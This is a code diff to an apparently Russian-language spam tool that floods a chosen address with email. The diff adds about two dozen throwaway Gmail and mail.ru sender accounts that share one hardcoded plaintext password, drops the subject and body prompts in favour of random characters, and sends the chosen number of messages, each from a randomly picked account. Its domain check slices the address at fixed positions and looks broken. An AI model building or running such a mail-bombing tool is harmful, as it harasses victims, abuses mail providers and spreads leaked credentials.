@@ -80,7 +80,6 @@ def sms():
 
 def mail():
   global Login
-  global U
   global P
   Login = [
   "spammerarnold1@gmail.com", 
@@ -88,10 +87,32 @@ def mail():
   "spammerarnold3@gmail.com",
   "spammerarnold4@gmail.com",
   "spammerarnold5@gmail.com",
-  "spammerarnold6@gmail.com"]
-  L = random.choice(Login)
+  "spammerarnold6@gmail.com",
+  "spammerarnold7@mail.ru",
+  "spammerarnold8@mail.ru",
+  "spammerarnold9@mail.ru",
+  "spammerarnold10@mail.ru",
+  "spammerarnold11@mail.ru",
+  "spammerarnold12@mail.ru",
+  "spammerarnold13@mail.ru",
+  "spammerarnold14@mail.ru",
+  "spammerarnold15@mail.ru",
+  "spammerarnold16@mail.ru",
+  "spammerarnold17@mail.ru",
+  "spammerarnold18@mail.ru",
+  "spammerarnold19@mail.ru",
+  "spammerarnold20@mail.ru",
+  "spammerarnold21@mail.ru",
+  "spammerarnold22@mail.ru",
+  "spammerarnold23@mail.ru",
+  "spammerarnold24@mail.ru",
+  "spammerarnold25@mail.ru",
+  "spammerarnold26@mail.ru",
+  "spammerarnold27@mail.ru",
+  "spammerarnold28@mail.ru",
+  "spammerarnold29@mail.ru",
+  "spammerarnold30@mail.ru"]
   P = "454647Ws"
-  U = "smtp.gmail.com"
   mail3()
 def mail3():
   global To
@@ -105,34 +126,6 @@ def mail3():
     print ('[!] Ошибка! Повтори запрос!')
     time.sleep(2)
     mail3()
-  else:
-    mail4()
-def mail4():
-  global T
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('Тема письма')
-  T = input ('>>>')
-  if T == "":
-    os.system('cls' if os.name=='nt' else 'clear')
-    print (logo)
-    print ('[!] Ошибка! Повтори запрос!')
-    time.sleep(2)
-    mail4()
-  else:
-    mail5()
-def mail5():
-  global M
-  os.system('cls' if os.name=='nt' else 'clear')
-  print (logo)
-  print ('Текст письма')
-  M = input ('>>>')
-  if M == "":
-    os.system('cls' if os.name=='nt' else 'clear')
-    print (logo)
-    print ('[!] Ошибка! Повтори запрос!')
-    time.sleep(2)
-    mail5()
   else:
     mail6()
 def mail6():
@@ -149,14 +142,22 @@ def mail6():
     mail6()
   else:
     for value in range( int( N ) ):
+      global L
+      L = random.choice(Login)
+      M = random.choice(chars)
+      T = random.choice(chars)
+      if L[20:24] == ".com":
+        U = "smtp.gmail.com"
+      if L[20:24] == ".ru" or L[20:24] == ".rus":
+        U = "smtp.mail.ru"
       msg = MIMEMultipart()
       msg[ 'Subject' ] = T
-      msg[ 'From' ] = random.choice(Login)
+      msg[ 'From' ] = L 
       body = M
       msg.attach( MIMEText( body, 'plain' ) )
       server = root.SMTP_SSL( U, 465 )
-      server.login( random.choice(Login), P )
-      server.sendmail( random.choice(Login), To, msg.as_string() )
+      server.login( L, P )
+      server.sendmail( L, To, msg.as_string() )
       server.quit()
       value += 1
     os.system('cls' if os.name=='nt' else 'clear')
@@ -309,6 +310,7 @@ logo = '''
 ║╚═╝║╔╗╔╣╔╗╣╔╗║║ ╔╗║║║║
 ║╔═╗║║║╚╣║║║╚╝║╚═╝╠╝╚╝║
 ╚╝ ╚╩╝╚═╩╝╚╩══╩═══╩═══╝'''
+chars = 'abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZйцукенгшщзхъфывапролджэячсмитьёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮЁ1234567890'
 userag=["Mozilla/5.0(Windows;U;WindowsNT6.1;sv-SE)AppleWebKit/533.19.4(KHTML,likeGecko)Version/5.0.3Safari/533.19.4","Mozilla/5.0(Linux;Android7.0;SM-G930VCBuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/58.0.3029.83MobileSafari/537.36","Mozilla/5.0(Linux;Android7.0;SM-G892ABuild/NRD90M;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/60.0.3112.107MobileSafari/537.36","Mozilla/5.0(Linux;Android7.1.1;G8231Build/41.2.A.0.219;wv)AppleWebKit/537.36(KHTML,likeGecko)Version/4.0Chrome/59.0.3071.125MobileSafari/537.36"]
 acpt=["Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\nAccept-Encoding:gzip,deflate\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language:en-US,en;q=0.5\r\n","Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding:br;q=1.0,gzip;q=0.8,*;q=0.1\r\n",]
 useragent=["Mozilla/5.0(Macintosh;IntelMacOSX10_9_3)AppleWebKit/537.75.14(KHTML,likeGecko)Version/7.0.3Safari/7046A194A","Mozilla/5.0(iPad;CPUOS6_0likeMacOSX)AppleWebKit/536.26(KHTML,likeGecko)Version/6.0Mobile/10A5355dSafari/8536.25","Mozilla/5.0(Macintosh;IntelMacOSX10_6_8)AppleWebKit/537.13+(KHTML,likeGecko)Version/5.1.7Safari/534.57.2","Mozilla/5.0(Macintosh;IntelMacOSX10_7_3)AppleWebKit/534.55.3(KHTML,likeGecko)Version/5.1.3Safari/534.53.10","Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/70.0.3538.77Safari/537.36","Mozilla/5.0(WindowsNT6.2;WOW64)AppleWebKit/537.36(KHTMLlikeGecko)Chrome/44.0.2403.155Safari/537.36","Mozilla/5.0(WindowsNT6.1)AppleWebKit/537.36(KHTML,likeGecko)Chrome/41.0.2228.0Safari/537.36","Mozilla/5.0(X11;Linuxi686;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(WindowsNT6.1;WOW64;rv:64.0)Gecko/20100101Firefox/64.0","Mozilla/5.0(X11;Linuxi586;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(WindowsNT6.2;WOW64;rv:63.0)Gecko/20100101Firefox/63.0","Mozilla/5.0(Macintosh;U;IntelMacOSX;en-US;rv:1.8.1.13)Gecko/20080313Firefox","Mozilla/5.0(Macintosh;U;PPCMacOSXMach-O;rv:1.8.1.16)Gecko/20080702Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;de-DE;rv:1.9.2.20)Gecko/20110803Firefox","Mozilla/5.0(Windows;U;WindowsNT5.1;en-GB;rv:1.9.0.6)Gecko/2009011913Firefox","Mozilla/5.0(X11;;Linuxx86_64;rv:1.8.1.6)Gecko/20070802Firefox","Mozilla/5.0(X11;U;GentooLinuxx86_64;pl-PL)GeckoFirefox"]#CodeByGogoZin
